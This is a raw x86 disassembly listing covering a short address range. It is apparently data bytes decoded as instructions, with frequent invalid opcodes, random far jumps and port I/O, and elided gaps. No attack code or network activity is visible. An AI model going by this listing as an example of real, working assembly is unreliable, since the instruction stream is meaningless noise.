  420859:	xchg   DWORD PTR [ebx+esi*4-0x11],ebp
  42085d:	sub    al,0xb0
  42085f:	push   eax
  420860:	gs mov ebx,0xe69df677
  420866:	sub    ch,BYTE PTR [edi-0x2]
  420869:	cmc    
  42086a:	lock fs jae 0x4208c6
  42086e:	xor    al,0x56
  420870:	mov    esi,0xb7cadae0
  420875:	iret   
  420876:	mov    al,ds:0x24a01009
  42087b:	test   DWORD PTR [bx+di-0xb32],esp
  420880:	neg    BYTE PTR [edx+eiz*8+0x42]
  420884:	scas   al,BYTE PTR es:[edi]
  420885:	scas   al,BYTE PTR es:[edi]
  420886:	hlt    
  420887:	cmp    al,BYTE PTR [ecx-0xb]
  42088a:	fcom   QWORD PTR [edi]
  42088c:	or     BYTE PTR [eax+eax*4-0x45],dh
  420890:	jns    0x4208db
  420892:	jp     0x4208e0
  420894:	sbb    eax,0x5eab98a7
  420899:	xchg   edx,eax
  42089a:	ins    BYTE PTR es:[edi],dx
  42089b:	mov    BYTE PTR [ecx-0x1e2cff99],bl
  4208a1:	gs sti 
  4208a3:	add    eax,0x6d6996bb
  4208a8:	cmp    ebx,DWORD PTR [edx]
  4208aa:	sbb    eax,0xfb2a03f6
  4208af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208b0:	imul   edx,DWORD PTR [eax+0x5f9dca23],0xffffffd2
  4208b7:	call   0xb47c:0x3151db88
  4208be:	push   0xec365851
  4208c3:	stos   DWORD PTR es:[edi],eax
  4208c4:	fnstsw WORD PTR [edi+0x7c]
  4208c7:	mov    esp,0x13b8d24b
  4208cc:	in     eax,dx
  4208cd:	xchg   edi,eax
  4208ce:	les    esp,FWORD PTR [esi]
  4208d0:	mov    ecx,0xd0ed83dd
  4208d5:	out    0xc2,al
  4208d7:	jb     0x420944
  4208d9:	fsubr  QWORD PTR [ebx-0x1a]
  4208dc:	jmp    0x6a9:0x14cd327d
  4208e3:	inc    ebx
  4208e4:	push   0x4ba0b4f7
  4208e9:	cs in  eax,dx
  4208eb:	shl    BYTE PTR [ebx],0x2d
  4208ee:	xchg   esp,eax
  4208ef:	jno    0x4208a0
  4208f1:	mov    BYTE PTR [ebp-0x681bd913],cl
  4208f7:	cwde   
  4208f8:	and    DWORD PTR [edi-0x28],esp
  4208fb:	retf   0xa41
  4208fe:	in     eax,dx
  4208ff:	sbb    DWORD PTR [esi-0x41],0xffffff9f
  420903:	fcom   st(0)
  420905:	jg     0x4208fd
  420907:	jmp    0x420901
  420909:	xor    cl,BYTE PTR [eax-0x29]
  42090c:	loope  0x4208d1
  42090e:	lahf   
  42090f:	out    0x96,al
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xcf
  420981:	clc    
  420982:	inc    ebp
  420983:	sbb    al,0x7f
  420985:	pop    ebx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0xb000001
  42098d:	loopne 0x42093d
  42098f:	div    BYTE PTR [ecx-0x4d446f20]
  420995:	call   0x1711:0xf8c1aaa
  42099c:	inc    esp
  42099d:	or     BYTE PTR [ecx-0x70],ch
  4209a0:	inc    ecx
  4209a1:	int    0xc5
  4209a3:	int3   
  4209a4:	loopne 0x420964
  4209a6:	cwde   
  4209a7:	dec    esp
  4209a8:	dec    esi
  4209a9:	adc    eax,DWORD PTR [ebp+0x5f]
  4209ac:	dec    esp
  4209ad:	adc    esp,eax
  4209af:	test   BYTE PTR [esi],al
  4209b1:	mov    eax,0x5f8fa66c
  4209b6:	stos   DWORD PTR es:[edi],eax
  4209b7:	dec    esp
  4209b8:	jmp    0x12510a82
  4209bd:	int3   
  4209be:	pop    esp
  4209bf:	frstpm(287 only) 
  4209c1:	aam    0xf0
  4209c3:	test   BYTE PTR [ecx+0x49],cl
  4209c6:	cwde   
  4209c7:	shl    ebx,0xbd
  4209ca:	sub    ecx,DWORD PTR [ecx+0x47e44854]
  4209d0:	xor    edi,DWORD PTR [ecx+0x38f3080f]
  4209d6:	xlat   BYTE PTR ds:[ebx]
  4209d7:	sub    BYTE PTR [esi-0x2a875438],cl
  4209dd:	cmc    
  4209de:	ds xor edx,ebx
  4209e1:	mov    ah,0x32
  4209e3:	cli    
  4209e4:	adc    BYTE PTR [ebp+eax*4+0x19698b09],ah
  4209eb:	cld    
  4209ec:	add    esp,ebx
  4209ee:	int3   
  4209ef:	enter  0xe6e1,0x55
  4209f3:	mov    ch,0x2e
  4209f5:	sub    DWORD PTR [edi+esi*2+0x3ecc5121],0xfcee8323
  420a00:	pop    edx
  420a01:	popf   
  420a02:	xchg   edx,eax
  420a03:	in     eax,0x2c
  420a05:	mov    ebp,0xb59eb5ba
  420a0a:	and    DWORD PTR [edx-0x52],eax
  420a0d:	pop    ecx
  420a0e:	punpckhbw mm5,QWORD PTR [esi]
  420a11:	fbstp  TBYTE PTR [ecx-0x58]
  420a14:	fdiv   DWORD PTR [ebx+0x7f4b4213]
  420a1a:	pop    esp
  420a1b:	adc    al,0x49
  420a1d:	or     edi,DWORD PTR [edi-0x6e]
  420a20:	cmc    
  420a21:	(bad)  
  420a22:	outs   dx,DWORD PTR ds:[esi]
  420a23:	and    dl,BYTE PTR [ebp-0xe6bad76]
  420a29:	jae    0x4209ec
  420a2b:	dec    eax
  420a2c:	mov    edi,0xa5b8c148
  420a31:	mov    dl,0xf4
  420a33:	out    dx,al
  420a34:	cmp    edi,ebx
  420a36:	fs test dh,dh
  420a39:	shr    DWORD PTR [ecx+0x4b214e53],0xc
  420a40:	cwde   
  420a41:	sbb    esi,esi
  420a43:	pop    es
  420a44:	fucom  st(2)
  420a46:	mov    eax,0xc017c3a3
  420a4b:	add    esp,DWORD PTR [eax-0x3ef4f12b]
  420a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a52:	idiv   DWORD PTR [edi]
  420a54:	and    DWORD PTR [ecx+0x69],ebx
  420a57:	ins    DWORD PTR es:[edi],dx
  420a58:	mov    cs,ecx
  420a5a:	jmp    0x420ab4
  420a5c:	sub    eax,0x7f499ec6
  420a61:	push   0x32
  420a63:	mov    bh,0x54
  420a65:	sar    ah,0x5c
  420a68:	push   cs
  420a69:	imul   eax,DWORD PTR [eax+0x13bd65ec],0xac2ff23d
  420a73:	das    
  420a74:	cld    
  420a75:	xor    eax,0x7bb9cd85
  420a7a:	out    dx,al
  420a7b:	push   edx
  420a7c:	mov    ecx,0x65e301d9
  420a81:	retf   0x208
  420a84:	fistp  QWORD PTR [esi]
  420a86:	xchg   ebp,eax
  420a87:	enter  0x5477,0xc8
  420a8b:	arpl   WORD PTR [bx+si],bp
  420a8e:	mov    dl,dl
  420a90:	add    DWORD PTR [eax],0x0
	...
  420af2:	add    BYTE PTR [eax],al
  420af4:	fbstp  TBYTE PTR [edx]
  420af6:	scas   eax,DWORD PTR es:[edi]
  420af7:	adc    ebp,edi
  420af9:	lahf   
  420afa:	(bad)  
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	add    DWORD PTR [ebp+0x5d],eax
  420b03:	arpl   WORD PTR [esp+ebx*2+0x1050001],ax
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	inc    esp
  420b0d:	in     eax,0xe9
  420b0f:	jne    0x420ad5
  420b11:	loop   0x420b1e
  420b13:	ds xchg edx,eax
  420b15:	mov    dl,0x7f
  420b17:	jge    0x420b5d
  420b19:	xlat   BYTE PTR ds:[ebx]
  420b1a:	in     eax,dx
  420b1b:	mov    fs,esp
  420b1d:	add    ch,bh
  420b1f:	arpl   WORD PTR [esi-0x47],bp
  420b22:	xchg   DWORD PTR [edi+ecx*8+0x6b54711d],ecx
  420b29:	sahf   
  420b2a:	mov    bh,BYTE PTR [edx]
  420b2c:	out    dx,al
  420b2d:	mov    esp,0x3e75604e
  420b32:	push   es
  420b33:	in     eax,dx
  420b34:	xor    ebp,DWORD PTR [ecx]
  420b36:	repz xor eax,0xa660f89f
  420b3c:	mov    ecx,0x7e60d1bf
  420b41:	mov    al,ds:0x489eaf25
  420b46:	or     dh,BYTE PTR [edx-0x43]
  420b49:	mov    dh,0x7
  420b4b:	xchg   edx,eax
  420b4c:	mov    dl,0xd4
  420b4e:	xchg   ebp,eax
  420b4f:	dec    edx
  420b50:	mov    edi,0xe7a7a1cb
  420b55:	push   0xffffffaa
  420b57:	imul   ebx,DWORD PTR [ecx-0x55d6bfbb],0xfffffff3
  420b5e:	sub    DWORD PTR [ebx+0x4e],0x61
  420b62:	adc    esi,DWORD PTR [edx]
  420b64:	data16 mov WORD PTR [ebx+0x32],gs
  420b68:	fild   QWORD PTR [edi-0x4b]
  420b6b:	adc    ch,BYTE PTR [esi]
  420b6d:	std    
  420b6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b6f:	dec    ebp
  420b70:	xchg   edi,eax
  420b71:	sbb    BYTE PTR [ebp+0x4e],dh
  420b74:	push   ss
  420b75:	dec    ecx
  420b76:	push   es
  420b77:	sbb    eax,0x4b666ef8
  420b7c:	mov    ah,0x57
  420b7e:	cmp    eax,0x2ccc0d4d
  420b83:	add    dl,ch
  420b85:	push   es
  420b86:	sbb    BYTE PTR [ebx+0x2b9ea819],bh
  420b8c:	enter  0xf810,0x44
  420b90:	test   bh,dl
  420b92:	push   0xc2871f51
  420b97:	dec    ebp
  420b98:	adc    ebx,DWORD PTR [edi+0x67]
  420b9b:	sahf   
  420b9c:	mov    eax,ecx
  420b9e:	mov    cl,0x70
  420ba0:	mov    esp,DWORD PTR [ebx-0x350eb5a6]
  420ba6:	mov    ecx,0xc6ea60ce
  420bab:	shl    BYTE PTR [ebp-0x2a],cl
  420bae:	cmp    edx,DWORD PTR [ecx-0x3f]
  420bb1:	pop    eax
  420bb2:	ins    DWORD PTR es:[edi],dx
  420bb3:	cdq    
  420bb4:	(bad)  
  420bb5:	jae    0x420b59
  420bb7:	push   esp
  420bb8:	or     al,0xf3
  420bba:	dec    edx
  420bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bbc:	xchg   esi,eax
  420bbd:	aam    0xe1
  420bbf:	loop   0x420bb8
  420bc1:	add    eax,0xabe500f3
  420bc6:	leave  
  420bc7:	sub    al,0x8c
  420bc9:	mov    ah,0x4e
  420bcb:	out    dx,eax
  420bcc:	cmc    
  420bcd:	aas    
  420bce:	fimul  DWORD PTR [ebx-0x56]
  420bd1:	pushw  ss
  420bd3:	inc    esp
  420bd4:	xchg   bx,ax
  420bd6:	lods   eax,DWORD PTR ds:[esi]
  420bd7:	les    ebx,FWORD PTR [ecx-0x65e33fe8]
  420bdd:	sub    eax,0xfc09572e
  420be2:	test   eax,0x9e0405f8
  420be7:	push   ecx
  420be8:	or     DWORD PTR [esi],eax
  420bea:	sbb    BYTE PTR [eax],dh
  420bec:	pop    ecx
  420bed:	(bad)  
  420bee:	adc    DWORD PTR [ebx],esi
  420bf0:	xlat   BYTE PTR ds:[ebx]
  420bf1:	cmp    DWORD PTR [edx+0x1abedc8d],ecx
  420bf7:	xchg   ecx,eax
  420bf8:	sub    BYTE PTR [edi],ch
  420bfa:	push   es
  420bfb:	xchg   edi,eax
  420bfc:	arpl   WORD PTR [eax-0x21],bp
  420bff:	test   al,0x40
  420c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c02:	sar    dl,0x2f
  420c05:	ins    DWORD PTR es:[edi],dx
  420c06:	fwait
  420c07:	sub    DWORD PTR [eax+edx*2+0x5d],edx
  420c0b:	sub    BYTE PTR [esi+0xb],bl
  420c0e:	lods   al,BYTE PTR ds:[esi]
  420c0f:	cmp    al,BYTE PTR [eax+eax*1+0x0]
	...
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	adc    BYTE PTR [ebp+0x5d89a917],cl
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    eax,0x22000001
  420c8d:	sub    al,0xb9
  420c8f:	shl    bh,0x59
  420c92:	(bad)  
  420c93:	sti    
  420c94:	push   esi
  420c95:	add    cl,BYTE PTR [ecx]
  420c97:	or     dh,al
  420c99:	jp     0x420c80
  420c9b:	loope  0x420c8d
  420c9d:	out    dx,eax
  420c9e:	je     0x420c74
  420ca0:	cmp    BYTE PTR [ecx-0x465fc030],cl
  420ca6:	cmp    eax,0xff7a1e33
  420cab:	or     dl,bl
  420cad:	repz mul DWORD PTR [ecx+0xeec4675]
  420cb4:	xlat   BYTE PTR ds:[ebx]
  420cb5:	stos   BYTE PTR es:[edi],al
  420cb6:	and    BYTE PTR [edi],0x84
  420cb9:	mov    al,ds:0xde3991aa
  420cbe:	or     esi,eax
  420cc0:	stos   BYTE PTR es:[edi],al
  420cc1:	jmp    0x420c72
  420cc3:	out    0xdd,eax
  420cc5:	out    dx,eax
  420cc6:	pop    esi
  420cc7:	inc    ebx
  420cc8:	push   es
  420cc9:	ss ret 
  420ccb:	stos   DWORD PTR es:[edi],eax
  420ccc:	call   0x5a03:0xd42bf2ac
  420cd3:	push   es
  420cd4:	dec    esi
  420cd5:	bound  eax,QWORD PTR [esi]
  420cd7:	sub    eax,0x97abe626
  420cdc:	neg    BYTE PTR [edx-0x2f]
  420cdf:	ins    BYTE PTR es:[edi],dx
  420ce0:	loope  0x420d1c
  420ce2:	fsubr  QWORD PTR [eax]
  420ce4:	int    0x23
  420ce6:	xor    DWORD PTR [esi+0x30],edi
  420ce9:	mov    al,0x6b
  420ceb:	add    eax,0xbf99febd
  420cf0:	iret   
  420cf1:	dec    edi
  420cf2:	jmp    0x106:0xc1d92525
  420cf9:	mov    DWORD PTR [edi],ecx
  420cfb:	inc    eax
  420cfc:	xchg   esi,eax
  420cfd:	jno    0x420d30
  420cff:	jl     0x420c8d
  420d01:	jnp    0x420d27
  420d03:	hlt    
  420d04:	clc    
  420d05:	rcr    DWORD PTR [ecx],cl
  420d07:	aas    
  420d08:	xor    ebx,esi
  420d0a:	dec    edi
  420d0b:	push   esi
  420d0c:	cmp    edi,DWORD PTR [ebx]
  420d0e:	mov    ?,WORD PTR [esi]
  420d10:	push   ebp
  420d11:	xchg   edi,eax
  420d12:	push   edi
  420d13:	add    al,0xa4
  420d15:	or     DWORD PTR ds:0xee59b61c,eax
  420d1b:	out    0x84,eax
  420d1d:	jg     0x420ccb
  420d1f:	jno    0x420ca7
  420d21:	xchg   esi,eax
  420d22:	fidivr DWORD PTR [esp+edi*8+0x5332fbc0]
  420d29:	in     eax,dx
  420d2a:	jmp    0x4e7b:0xb94ef71e
  420d31:	jl     0x420d3d
  420d33:	cs into 
  420d35:	fld    TBYTE PTR [ebp+0x40de7c30]
  420d3b:	mov    edx,0x36a31394
  420d40:	sbb    al,0xd1
  420d42:	out    dx,eax
  420d43:	xchg   esp,eax
  420d44:	cwde   
  420d45:	dec    esp
  420d46:	ret    0x222b
  420d49:	mov    esp,0xdc58b6a0
  420d4e:	(bad)  
  420d4f:	and    BYTE PTR ds:0x9849c694,dl
  420d55:	cmp    BYTE PTR [edi+0x0],0xde
  420d59:	sub    bh,BYTE PTR [ecx-0x2d608029]
  420d5f:	or     BYTE PTR fs:[eax+0x5b67d9be],bl
  420d66:	and    DWORD PTR [eax],esi
  420d68:	mov    edx,DWORD PTR [edx-0x26]
  420d6b:	sar    DWORD PTR [ebp+0x1a],1
  420d6e:	push   ebx
  420d6f:	mov    al,ds:0xe1b8fb99
  420d74:	cli    
  420d75:	jg     0x420def
  420d77:	sahf   
  420d78:	push   0xffffff9a
  420d7a:	test   al,0xc0
  420d7c:	mov    edx,0x5291af33
  420d81:	shl    DWORD PTR [esi],0xe7
  420d84:	xchg   ebp,eax
  420d85:	(bad)  
  420d86:	sbb    al,0xac
  420d88:	mov    ebp,0x90eb355f
  420d8d:	sub    al,0xc7
  420d8f:	jbe    0x420dd9
	...
  420df1:	add    BYTE PTR [eax],al
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xd01dd63f
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0x67000001,al
  420e0d:	into   
  420e0e:	jae    0x420e36
  420e10:	stc    
  420e11:	call   0x74c4422b
  420e16:	(bad)  
  420e17:	in     eax,0x1d
  420e19:	mov    ah,0x8
  420e1b:	pop    esi
  420e1c:	fisttp WORD PTR [ebx-0x52]
  420e1f:	add    eax,0x2d29c304
  420e24:	sahf   
  420e25:	ss jb  0x420dd1
  420e28:	repz mov al,dl
  420e2b:	cmp    al,0xb5
  420e2d:	and    eax,0x3adfdaa
  420e32:	mov    al,0x5d
  420e34:	sub    ecx,DWORD PTR [esp+edx*2-0x66619ef9]
  420e3b:	cmp    eax,0x62cb8957
  420e40:	js     0x420e1e
  420e42:	call   0x560f:0x55155b53
  420e49:	mul    BYTE PTR [esi+0x52]
  420e4c:	mov    WORD PTR [eax],ds
  420e4e:	(bad)  
  420e4f:	in     eax,0x4a
  420e51:	stos   DWORD PTR es:[edi],eax
  420e52:	fnstenv [ecx-0x21883c2e]
  420e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e59:	or     BYTE PTR [edi],0x10
  420e5c:	push   esp
  420e5d:	out    dx,eax
  420e5e:	jnp    0x420eac
  420e60:	imul   edi,DWORD PTR [ebx-0x4e],0x33
  420e64:	mov    bl,0x34
  420e66:	adc    BYTE PTR [ecx],bl
  420e68:	dec    esp
  420e69:	sub    eax,0xb8f3a98e
  420e6e:	out    0xd9,eax
  420e70:	mov    ds:0x391f4cd9,eax
  420e75:	adc    ebp,esi
  420e77:	mov    ebx,0x564fa951
  420e7c:	xor    ecx,DWORD PTR [edx+eax*2]
  420e7f:	lock lods eax,DWORD PTR ds:[esi]
  420e81:	cdq    
  420e82:	js     0x420eab
  420e84:	int    0xa7
  420e86:	push   cs
  420e87:	mov    al,ds:0x9451740c
  420e8c:	popf   
  420e8d:	xlat   BYTE PTR fs:[ebx]
  420e8f:	sub    bl,ah
  420e91:	inc    esi
  420e92:	inc    esp
  420e93:	sub    al,0x39
  420e95:	push   ss
  420e96:	and    DWORD PTR [eax+0x414c78a7],eax
  420e9c:	push   cs
  420e9d:	shl    BYTE PTR [edx],1
  420e9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ea0:	out    0x3d,al
  420ea2:	jnp    0x420edf
  420ea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ea5:	or     BYTE PTR [eax-0x2],dl
  420ea8:	add    bl,ch
  420eaa:	in     al,0x1e
  420eac:	loop   0x420f21
  420eae:	cmp    al,0xd9
  420eb0:	dec    edx
  420eb1:	dec    edx
  420eb2:	push   ecx
  420eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eb4:	sub    al,0x30
  420eb6:	push   edi
  420eb7:	mov    eax,ds:0x7810b9b6
  420ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ebd:	cdq    
  420ebe:	adc    al,0x7c
  420ec0:	xor    BYTE PTR cs:[esi],dh
  420ec3:	out    dx,eax
  420ec4:	add    edx,DWORD PTR [ecx+0x4]
  420ec7:	inc    ecx
  420ec8:	outs   dx,BYTE PTR ds:[esi]
  420ec9:	xchg   ecx,eax
  420eca:	fs xchg edx,eax
  420ecc:	mov    edx,ecx
  420ece:	and    DWORD PTR ds:0x65e2ab07,esp
  420ed4:	fild   WORD PTR [eax]
  420ed6:	sbb    al,0xd5
  420ed8:	cmp    eax,0x49ff6dbb
  420edd:	sbb    edi,esi
  420edf:	out    0x99,al
  420ee1:	inc    edx
  420ee2:	sub    DWORD PTR [ebp+eax*8-0x51],0x39e5b967
  420eea:	pop    ebx
  420eeb:	mov    BYTE PTR [ecx+0x6a927447],dh
  420ef1:	mov    ebp,0x1af3fc45
  420ef6:	nop
  420ef7:	fidiv  WORD PTR [esi-0x63]
  420efa:	shr    BYTE PTR [edi+0xc277d5a],0x3c
  420f01:	jbe    0x420f3c
  420f03:	xchg   esi,eax
  420f04:	sub    ebx,DWORD PTR [ecx-0x76]
  420f07:	adc    cl,bh
  420f09:	stos   DWORD PTR es:[edi],eax
  420f0a:	inc    ebx
  420f0b:	mov    ah,0x46
  420f0d:	sub    ecx,edx
  420f0f:	cdq    
  420f10:	xchg   ebp,eax
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x2a1bc5d7]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x61000001
  420f8d:	in     eax,0x4f
  420f8f:	cdq    
  420f90:	inc    ebx
  420f91:	fldcw  WORD PTR [esi+0xc4a6d61]
  420f97:	adc    cl,BYTE PTR [ebx-0x4f455c78]
  420f9d:	adc    BYTE PTR [ebx],ch
  420f9f:	push   esp
  420fa0:	vpsubq ymm7,ymm3,YMMWORD PTR [ebx]
  420fa4:	xor    DWORD PTR [ecx-0x15],ebx
  420fa7:	stc    
  420fa8:	sbb    BYTE PTR [esi],cl
  420faa:	push   esp
  420fab:	shr    dh,0xd2
  420fae:	add    DWORD PTR [eax+0x1d987247],edx
  420fb4:	test   al,0xbc
  420fb6:	cdq    
  420fb7:	and    al,0x84
  420fb9:	mov    ch,0x33
  420fbb:	push   ebx
  420fbc:	int    0x3
  420fbe:	adc    DWORD PTR [edx],0xb22cb818
  420fc4:	sub    ebx,esp
  420fc6:	jle    0x421001
  420fc8:	jbe    0x420fbd
  420fca:	jno    0x420ffe
  420fcc:	shrd   DWORD PTR [ebx-0x103eeda7],ecx,0xd1
  420fd4:	stos   DWORD PTR es:[edi],eax
  420fd5:	(bad)  
  420fd6:	mov    esi,0xec3c715f
  420fdb:	xchg   edi,eax
  420fdc:	fisub  DWORD PTR [edi]
  420fde:	adc    BYTE PTR [edx],ah
  420fe0:	out    0xdd,al
  420fe2:	mov    ds:0xa885c2b5,eax
  420fe7:	or     bl,BYTE PTR [ebp+0x23]
  420fea:	imul   eax,DWORD PTR [esi+eax*2],0x4e
  420fee:	push   esp
  420fef:	fistp  QWORD PTR [edi]
  420ff1:	arpl   WORD PTR [edx+0x67],bx
  420ff4:	jecxz  0x420fda
  420ff6:	test   eax,0x860732df
  420ffb:	adc    al,0x93
  420ffd:	cld    
  420ffe:	sbb    eax,0x6ac8594
  421003:	mov    BYTE PTR [ebp+0x386ec5aa],al
  421009:	je     0x420fb8
  42100b:	inc    ecx
  42100c:	pop    es
  42100d:	iret   
  42100e:	(bad)  
  42100f:	not    DWORD PTR [eax]
  421011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421012:	adc    BYTE PTR [ebx],bl
  421014:	repnz ins BYTE PTR es:[edi],dx
  421016:	adc    dl,BYTE PTR [edx-0x78]
  421019:	mov    ds:0x5ee8fa14,eax
  42101e:	jcxz   0x421062
  421021:	fmulp  st(0),st
  421023:	add    cl,cl
  421025:	test   BYTE PTR [ebp+0x282131c5],bh
  42102b:	(bad)  
  42102c:	pop    esp
  42102d:	pop    esi
  42102e:	fucomp st(6)
  421030:	ds adc al,dl
  421033:	hlt    
  421034:	mov    edx,0xabda248
  421039:	xor    DWORD PTR [esi+0x2a3237e8],ebp
  42103f:	pusha  
  421040:	push   ebp
  421041:	iret   
  421042:	nop
  421043:	fwait
  421044:	and    dl,bh
  421046:	push   ebp
  421047:	sub    eax,0xc426a6fa
  42104c:	mov    BYTE PTR [esi-0x48c9d032],bl
  421052:	cmp    DWORD PTR [ebx+eiz*4-0x62],0x2c
  421057:	in     eax,0x82
  421059:	into   
  42105a:	rcl    DWORD PTR [edx],1
  42105c:	jl     0x421023
  42105e:	hlt    
  42105f:	retf   0xf4f8
  421062:	(bad)  
  421063:	lock fst DWORD PTR [eax+0x73855232]
  42106a:	adc    ah,cl
  42106c:	push   esi
  42106d:	add    ebx,DWORD PTR fs:[esi-0x7f21fd8b]
  421074:	push   ecx
  421075:	lock jmp 0xab1b:0x17684a00
  42107d:	push   0x5b
  42107f:	(bad)  
  421080:	call   0x4d09a31c
  421085:	dec    ecx
  421086:	xchg   ecx,eax
  421087:	xor    al,0x9
  421089:	push   ebx
  42108a:	or     al,0x45
  42108c:	popf   
  42108d:	mov    esp,0xab3c5c
	...
  4210f2:	add    BYTE PTR [eax],al
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    es,ebx
  421101:	shr    DWORD PTR [ebx+0x16098d0],0x0
  421108:	add    eax,0x6a000001
  42110d:	jg     0x42114a
  42110f:	xlat   BYTE PTR ds:[ebx]
  421110:	mov    eax,0x2c7b7b10
  421115:	sbb    al,BYTE PTR cs:[esi-0x254e0f1]
  42111c:	jp     0x421170
  42111e:	mov    dh,0x13
  421120:	repnz lea eax,ds:0x5d2b1023
  421127:	sbb    eax,0x19b3b983
  42112c:	pop    edx
  42112d:	outs   dx,BYTE PTR ds:[esi]
  42112e:	clc    
  42112f:	inc    esp
  421130:	mov    cl,0x18
  421132:	cmp    eax,0x8e2b5dcb
  421137:	in     al,0x1a
  421139:	pop    ds
  42113a:	pushf  
  42113b:	mov    bl,0x6a
  42113d:	lods   al,BYTE PTR ds:[esi]
  42113e:	jnp    0x421191
  421140:	cmp    bh,ch
  421142:	adc    BYTE PTR [edi+0x26],dh
  421145:	or     ch,BYTE PTR [edx]
  421147:	mov    ah,0xeb
  421149:	mov    WORD PTR [edi-0x2c3cf368],ss
  42114f:	int    0x89
  421151:	jae    0x4210fe
  421153:	daa    
  421154:	sub    DWORD PTR [ebp+0x15],esi
  421157:	into   
  421158:	std    
  421159:	mov    ds:0x5bf7f7a1,eax
  42115e:	call   0x34fd5a21
  421163:	gs pop es
  421165:	mov    edx,0xfd3eda3d
  42116a:	je     0x421159
  42116c:	jmp    0xf6a0:0x3eddfbcf
  421173:	outs   dx,DWORD PTR ds:[esi]
  421174:	adc    ch,BYTE PTR [esi]
  421176:	push   eax
  421177:	outs   dx,BYTE PTR ds:[esi]
  421178:	dec    ebp
  421179:	(bad)  
  42117b:	push   eax
  42117c:	mov    WORD PTR [bx+di-0x783e],gs
  421181:	or     bh,BYTE PTR [edx+0x323aadcb]
  421187:	data16 xlat BYTE PTR ds:[ebx]
  421189:	nop
  42118a:	adc    DWORD PTR [esi],esi
  42118c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42118d:	adc    DWORD PTR [edx],esi
  42118f:	jg     0x4211a4
  421191:	sub    BYTE PTR [edi-0x64],cl
  421194:	jg     0x421209
  421196:	leave  
  421197:	cmp    esi,esp
  421199:	push   ds
  42119a:	dec    edx
  42119b:	push   edi
  42119c:	or     al,0xe8
  42119e:	sub    dl,dh
  4211a0:	stos   DWORD PTR es:[edi],eax
  4211a1:	and    edi,DWORD PTR [eax]
  4211a3:	mov    ebp,0xe0916a53
  4211a8:	and    dl,BYTE PTR [edx+0x14]
  4211ab:	mov    bh,0x7
  4211ad:	inc    ebp
  4211ae:	dec    edi
  4211af:	xor    ecx,DWORD PTR [edx]
  4211b1:	pop    ebx
  4211b2:	data16 jecxz 0x42118d
  4211b5:	push   cs
  4211b6:	test   BYTE PTR [eax],0x1d
  4211b9:	jg     0x421201
  4211bb:	inc    edx
  4211bc:	les    ebp,FWORD PTR [esi+0x70962678]
  4211c2:	cdq    
  4211c3:	test   edi,ecx
  4211c5:	int3   
  4211c6:	shr    ah,0x82
  4211c9:	dec    edx
  4211ca:	in     eax,0xa0
  4211cc:	mov    dh,0xbc
  4211ce:	in     al,dx
  4211cf:	je     0x42116a
  4211d1:	jmp    0x4d4f:0x55b26fda
  4211d8:	outs   dx,BYTE PTR ds:[esi]
  4211d9:	int3   
  4211da:	out    dx,al
  4211db:	mov    edi,ebx
  4211dd:	lods   al,BYTE PTR ds:[esi]
  4211de:	(bad)  
  4211df:	mov    eax,ds:0x2d0fd231
  4211e4:	mov    ah,0x2
  4211e6:	cmp    bl,ah
  4211e8:	jmp    0x2b75:0x6df0b582
  4211ef:	das    
  4211f0:	rol    edx,0x51
  4211f3:	jb     0x4211cb
  4211f5:	mov    ah,BYTE PTR [ecx]
  4211f7:	(bad)  
  4211f8:	xlat   BYTE PTR ds:[ebx]
  4211f9:	push   0x8296dc94
  4211fe:	push   ss
  4211ff:	pop    edi
  421200:	dec    eax
  421201:	sti    
  421202:	add    eax,0x948b78c6
  421207:	cmp    DWORD PTR [ecx-0x221ced9],edi
  42120d:	cwde   
  42120e:	daa    
  42120f:	mov    cl,dh
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x923f7ab3
  421282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421283:	out    dx,al
  421284:	popf   
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
